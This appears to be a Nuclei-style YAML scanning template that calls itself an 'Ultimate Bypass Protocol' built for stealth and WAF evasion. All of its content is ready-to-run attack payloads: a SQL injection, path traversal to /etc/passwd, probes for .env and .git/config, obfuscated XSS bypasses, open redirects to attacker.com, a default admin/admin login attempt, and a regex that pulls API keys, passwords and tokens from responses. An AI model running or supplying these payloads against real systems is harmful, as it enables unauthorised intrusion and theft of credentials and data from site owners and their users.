id: Thenawabx-suite

info:
  name: 💀 Nawab-Ultimate-Bypass-Protocol 💀
  author: thenawabx
  severity: critical
  description: |
    Combined Stealth Operations: SQLi, XSS, LFI, Redirect, and Default Auth.
    Designed for maximum WAF evasion and deep impact analysis.
  tags: nawab-elite, critical-impact, bypass-v1

http:
  - method: GET
    path:
      # --- [P0] SQLi & LFI Payloads ---
      - "{{BaseURL}}?id=1%27%20UNION%20SELECT%20null,CONCAT(0x726f6f74),null--"
      - "{{BaseURL}}?file=../../../../etc/passwd"
      - "{{BaseURL}}?path=..%252f..%252f..%252fetc/passwd"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.git/config"
      
      # --- [P1] XSS WAF Bypass Payloads ---
      - "{{BaseURL}}/?q=<svg/onload=confirm?.(document.domain)>"
      - "{{BaseURL}}/?id=<details/open/ontoggle=prompt?.(1)>"
      - "{{BaseURL}}/?name=<img/src/onerror=confirm?.(8)>"
      - "{{BaseURL}}/?query=<svg//onload=%26%2397%3Blert%26%2340%3B1%26%2341%3B>"
      
      # --- [P2] Open Redirect Payloads ---
      - "{{BaseURL}}/?url=http://attacker.com"
      - "{{BaseURL}}/?redirect=//attacker.com"
      - "{{BaseURL}}/?dest=/\attacker.com"

    matchers-condition: or
    matchers:
      # ইউনিক নাম: NAWAB-GOD-MODE (Critical)
      - type: regex
        name: "🔥🔥 NAWAB-GOD-MODE: SERVER-COMPROMISED 🔥🔥"
        regex:
          - "root:x:0:0"
          - "SQL syntax.*MySQL"
          - "PostgreSQL.*ERROR"
        part: body

      # ইউনিক নাম: NAWAB-ELITE-STRIKE (High)
      - type: regex
        name: "⚡⚡ NAWAB-ELITE-STRIKE: XSS-BYPASS ⚡⚡"
        regex:
          - "(?i)(<svg/onload=|<details/open/ontoggle=|<img/src/onerror=)"
        part: body

      # ইউনিক নাম: NAWAB-GHOST-MOVE (Medium)
      - type: regex
        name: "🛸🛸 NAWAB-GHOST-MOVE: REDIRECT-HIT 🛸🛸"
        part: header
        regex:
          - "(?i)Location: (https?://|//|/\\\\)attacker\\.com"

  - method: POST
    path:
      - "{{BaseURL}}/login"
    body: "user=admin&pass=admin"
    matchers-condition: and
    matchers:
      # ইউনিক নাম: NAWAB-AUTH-CRACK (Critical)
      - type: word
        name: "🔑🔑 NAWAB-AUTH-CRACK: DEFAULT-ADMIN 🔑🔑"
        words:
          - "Welcome Admin"
          - "Login Success"
        part: body
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: extracted-secrets
        regex:
          - '(?i)(api_key|password|auth_token|secret)[\s]*[:=][\s]*["'']([a-zA-Z0-9@#$%^&*]{6,64})["'']'
        part: body
